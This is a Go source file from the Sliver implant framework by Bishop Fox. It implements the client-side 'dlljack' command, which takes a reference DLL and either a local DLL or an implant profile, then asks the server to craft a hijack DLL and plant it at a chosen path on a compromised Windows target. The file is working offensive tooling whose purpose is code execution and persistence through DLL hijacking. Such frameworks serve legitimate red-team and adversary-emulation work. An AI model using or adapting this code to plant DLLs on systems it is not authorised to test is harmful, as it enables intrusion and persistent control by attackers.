package dllhijack

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"

	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// DllHijack - Implements the dlljack command
type DllHijack struct {
	Positional struct {
		TargetPath string `description:"remote path in which to upload the Hijacked DLL" required:"1-1"`
		RemotePath string `description:"remote path to the reference DLL" required:"1-1"`
	} `positional-args:"true" required:"true"`
	Options struct {
		LocalPath string `long:"local-reference" short:"l" description:"local path to the reference DLL" required:"1-1"`
		File      string `long:"file" short:"f" description:"local path to the DLL to plant for the hijack"`
		Profile   string `long:"profile" short:"p" description:"implant profile to use as a DLL to plant"`
	} `group:"loot fetch options"`
}

// Execute - Root environment variables management command
func (e *DllHijack) Execute(args []string) (err error) {
	var (
		localRefData  []byte
		targetDLLData []byte
	)
	session := core.ActiveTarget.Session()
	if session == nil {
		return
	}

	targetPath := e.Positional.TargetPath
	referencePath := e.Positional.RemotePath
	localFile := e.Options.File
	profileName := e.Options.Profile
	localReferenceFilePath := e.Options.LocalPath

	if referencePath == "" {
		return log.Errorf("Please provide a path to the reference DLL on the target system")
	}

	if localReferenceFilePath != "" {
		localRefData, err = ioutil.ReadFile(localReferenceFilePath)
		if err != nil {
			return log.Errorf("Could not load the reference file from the client: %s", err)
		}
	}

	if localFile != "" {
		if profileName != "" {
			return log.Errorf("please use either --profile or --File")
		}
		targetDLLData, err = ioutil.ReadFile(localFile)
		if err != nil {
			return log.Errorf("Error: %s\n", err)
		}
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Crafting and planting DLL at %s ...", targetPath)
	go log.SpinUntil(msg, ctrl)
	_, err = transport.RPC.HijackDLL(context.Background(), &clientpb.DllHijackReq{
		ReferenceDLLPath: referencePath,
		TargetLocation:   targetPath,
		ReferenceDLL:     localRefData,
		TargetDLL:        targetDLLData,
		Request:          core.ActiveTarget.Request(),
		ProfileName:      profileName,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		return log.Errorf("Error: %s", err)
	}

	log.Infof("DLL uploaded to %s", targetPath)
	return
}
